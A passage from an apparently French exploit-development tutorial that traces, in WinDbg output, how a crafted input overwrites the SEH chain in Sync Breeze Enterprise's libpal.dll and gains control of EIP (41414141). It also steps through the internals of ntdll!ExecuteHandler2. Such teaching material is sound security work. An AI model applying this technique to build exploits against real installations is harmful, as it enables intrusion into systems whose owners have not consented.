<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="n">00902a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
</code></pre></div>
<p>On relance donc l'exécution et on voit que <code>EIP</code> est maintenant initialisé à <code>41414141</code> indiquant qu'il est sous notre contrôle :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="p">(</span><span class="n">144</span><span class="p">.</span><span class="n">6dc</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">41414141</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">eip</span><span class="p">=</span><span class="n">41414141</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c6f438</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c6f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010246</span>
<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="n">41414141</span> <span class="p">??</span>              <span class="p">???</span>
</code></pre></div>
<h4 id="details">Details</h4>
<p>Si on affiche la <em>callstack</em> avec la commande <code>k</code> on voit que la dernière fonction appelée est <code>ntdll!ExecuteHandler2</code> qui est la fonction responsable de l'appel des <code>_except_handler</code>. :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">k</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a> <span class="c"># ChildEBP RetAddr  </span>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="n">WARNING</span><span class="p">:</span> <span class="n">Frame</span> <span class="n">IP</span> <span class="n">not</span> <span class="k">in</span> <span class="n">any</span> <span class="n">known</span> <span class="n">module</span><span class="p">.</span> <span class="n">Following</span> <span class="n">frames</span> <span class="n">may</span> <span class="n">be</span> <span class="n">wrong</span><span class="p">.</span>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="n">00</span> <span class="n">01c6f434</span> <span class="n">77853b02</span> <span class="n">0x41414141</span>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">01</span> <span class="n">01c6f458</span> <span class="n">77853ad4</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x26</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="n">02</span> <span class="n">01c6f528</span> <span class="n">77841586</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler</span><span class="p">+</span><span class="n">0x24</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="n">03</span> <span class="n">01c6f528</span> <span class="n">00902a9d</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">KiUserExceptionDispatcher</span><span class="p">+</span><span class="n">0x26</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a><span class="n">04</span> <span class="n">01c6fec8</span> <span class="n">00000000</span> <span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span>
</code></pre></div>
<p>On relance le service et WinDbg pour venir positionner un point d'arrêt sur la fonction <code>ntdll!ExecuteHandler2</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">bp</span> <span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span>
</code></pre></div>
<p>On relance ensuite l'exécution du service et on exécute l'exploit <code>python</code> qui entraine un premier <code>Access violation</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">(</span><span class="n">1f68</span><span class="p">.</span><span class="n">3c8</span><span class="p">):</span> <span class="n">Access</span> <span class="n">violation</span> <span class="p">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="n">and</span> <span class="n">handled</span><span class="p">.</span>
<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="p">***</span> <span class="n">WARNING</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">verify</span> <span class="n">checksum</span> <span class="k">for</span> <span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">Sync</span> <span class="n">Breeze</span> <span class="n">Enterprise</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">libpal</span><span class="p">.</span><span class="n">dll</span>
<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="n">eax</span><span class="p">=</span><span class="n">41414141</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c1fa1c</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1ff18</span> <span class="n">edx</span><span class="p">=</span><span class="n">01c1f9d4</span> <span class="n">esi</span><span class="p">=</span><span class="n">01c1ff18</span> <span class="n">edi</span><span class="p">=</span><span class="n">01c1fb20</span>
<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="n">eip</span><span class="p">=</span><span class="n">00872a9d</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f9a8</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1fec8</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00010206</span>
<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a><span class="n">libpal</span><span class="p">!</span><span class="n">SCA_ConfigObj</span><span class="p">::</span><span class="n">Deserialize</span><span class="p">+</span><span class="n">0x1d</span><span class="p">:</span>
<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">00872a9d</span> <span class="n">ff5024</span>          <span class="n">call</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="p">+</span><span class="n">24h</span><span class="p">]</span>  <span class="n">ds</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">41414165</span><span class="p">=????????</span>
</code></pre></div>
<p>On relance de nouveau l'exécution pour avoir la chance d'atteindre le point d'arrêt qui est atteint une première fois au sein du premier élément de la liste chainée :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853adc</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f45c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f528</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">:</span>
<a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="n">77853adc</span> <span class="n">55</span>              <span class="n">push</span>    <span class="nb">ebp</span>
</code></pre></div>
<p>On relance une dernière fois pour atteindre de nouveau le point d'arrêt, mais cette fois au sein du deuxième élément de la liste chainée :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">g</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="n">Breakpoint</span> <span class="n">0</span> <span class="n">hit</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853adc</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f45c</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f528</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">:</span>
<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="n">77853adc</span> <span class="n">55</span>              <span class="n">push</span>    <span class="nb">ebp</span>
</code></pre></div>
<p>On affiche le code assembleur sur le point d'être exécuté. Ce code se découpe en plusieurs sous-parties à analyser :</p>
<h5 id="1-push-et-1-mov">1 PUSH et 1 MOV</h5>
<p>Sauvegarde de <code>EBP</code> et copie <code>ESP</code> dans <code>EBP</code> pour accéder facilement aux arguments de la fonction <code>ntdll!ExecuteHandler2</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">u</span> <span class="nv">@eip</span> <span class="n">L11</span>
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">:</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">77853adc</span> <span class="n">55</span>              <span class="n">push</span>    <span class="nb">ebp</span>
<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">77853add</span> <span class="n">8bec</span>            <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
</code></pre></div>
<h5 id="3-push-et-1-mov">3 PUSH et 1 MOV</h5>
<p>Suite du code :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">77853adf</span> <span class="n">ff750c</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">0Ch</span><span class="p">]</span>
<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">77853ae2</span> <span class="n">52</span>              <span class="n">push</span>    <span class="n">edx</span>
<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="n">77853ae3</span> <span class="n">64ff3500000000</span>  <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="p">:[</span><span class="n">0</span><span class="p">]</span>
<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">77853aea</span> <span class="n">64892500000000</span>  <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="p">:[</span><span class="n">0</span><span class="p">],</span><span class="n">esp</span>
</code></pre></div>
<ul>
<li>Le premier <code>push</code> viens positionner le membre <code>Next</code> de la structure <code>_EXCEPTION_REGISTRATION_RECORD</code> sur la stack</li>
</ul>
<p>On voit que l'adresse <code>01c1ff54</code> du membre <code>Next</code> est bien la même que celle stockée dans la pile via le <code>push</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853adf</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x3</span><span class="p">:</span>
<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">77853adf</span> <span class="n">ff750c</span>          <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span><span class="p">+</span><span class="n">0Ch</span><span class="p">]</span>  <span class="n">ss</span><span class="p">:</span><span class="n">0023</span><span class="p">:</span><span class="n">01c1f464</span><span class="p">=</span><span class="n">01c1ff54</span>
<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">002b7000</span>
<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">01c1fe1c</span>
<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">01c20000</span>
<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">01c1e000</span>
<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="p">[...]</span>
<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">dt</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span> <span class="n">01c1fe1c</span>
<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>   <span class="p">+</span><span class="n">0x000</span> <span class="n">Next</span>             <span class="p">:</span> <span class="n">0x01c1ff54</span> <span class="n">_EXCEPTION_REGISTRATION_RECORD</span>
<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>   <span class="p">+</span><span class="n">0x004</span> <span class="n">Handler</span>          <span class="p">:</span> <span class="n">0x008edf5b</span>     <span class="n">_EXCEPTION_DISPOSITION</span>  <span class="n">libpal</span><span class="p">!</span><span class="n">md5_starts</span><span class="p">+</span><span class="n">0</span>
</code></pre></div>
<ul>
<li>Le deuxième <code>push</code> viens placer l'adresse de <code>ntdll!ExecuteHandler2+</code> sur la pile</li>
</ul>
<p>Stockage de <code>edx</code> sur la pile :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853ae2</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f454</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x6</span><span class="p">:</span>
<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="n">77853ae2</span> <span class="n">52</span>              <span class="n">push</span>    <span class="n">edx</span>
<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">u</span> <span class="nv">@edx</span>
<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x44</span><span class="p">:</span>
<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="p">[...]</span>
</code></pre></div>
<ul>
<li>Le troisieme <code>push</code> viens placer <code>ExceptionList</code> sur la pile</li>
</ul>
<p>On voit que l'adresse <code>01c1fe1c</code> du membre <code>ExceptionList</code> du <code>TEB</code> est la même que celle stockée dans la pile via le <code>push</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="n">eax</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ebx</span><span class="p">=</span><span class="n">00000000</span> <span class="n">ecx</span><span class="p">=</span><span class="n">01c1f4cc</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="n">eip</span><span class="p">=</span><span class="n">77853ae3</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c1f450</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c1f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="n">ntdll</span><span class="p">!</span><span class="n">ExecuteHandler2</span><span class="p">+</span><span class="n">0x7</span><span class="p">:</span>
<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a><span class="n">77853ae3</span> <span class="n">64ff3500000000</span>  <span class="n">push</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="p">:[</span><span class="n">0</span><span class="p">]</span>     <span class="n">fs</span><span class="p">:</span><span class="n">003b</span><span class="p">:</span><span class="n">00000000</span><span class="p">=</span><span class="n">01c1fe1c</span>
<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="p">!</span><span class="n">teb</span>
<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="n">TEB</span> <span class="n">at</span> <span class="n">002b7000</span>
<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>    <span class="n">ExceptionList</span><span class="p">:</span>        <span class="n">01c1fe1c</span>
<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>    <span class="n">StackBase</span><span class="p">:</span>            <span class="n">01c20000</span>
<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>    <span class="n">StackLimit</span><span class="p">:</span>           <span class="n">01c1e000</span>
<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a><span class="p">[...]</span>
</code></pre></div>
<ul>
<li>Le <code>mov</code> réécrit <code>ExceptionList</code> du <em>thread</em> courrant par la valeur du registre <code>ESP</code></li>
</ul>
<p>Réécriture de <code>ExceptionList</code> avec la valeur de <code>ESP</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">0</span><span class="p">:</span><span class="n">011</span><span class="p">&gt;</span> <span class="n">t</span>
